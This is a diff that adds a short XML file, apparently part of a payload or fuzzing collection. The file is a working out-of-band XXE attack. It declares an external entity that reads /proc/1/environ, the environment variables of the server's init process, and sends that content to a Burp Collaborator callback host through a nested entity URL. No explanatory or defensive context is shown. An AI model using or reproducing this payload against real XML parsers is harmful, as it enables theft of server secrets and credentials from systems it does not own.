@@ -1,0 +1,5 @@
+<?xml version='1.0' encoding='utf-16'?>
+<!ENTITY % file SYSTEM "file:///proc/1/environ">
+<!ENTITY % eval '<!ENTITY &#x25; error SYSTEM &#x27;http://sfbk07gx2aqororg0nckn9kycpif64.burpcollaborator.net/%file;&#x27;>'>
+%eval;
+%error;
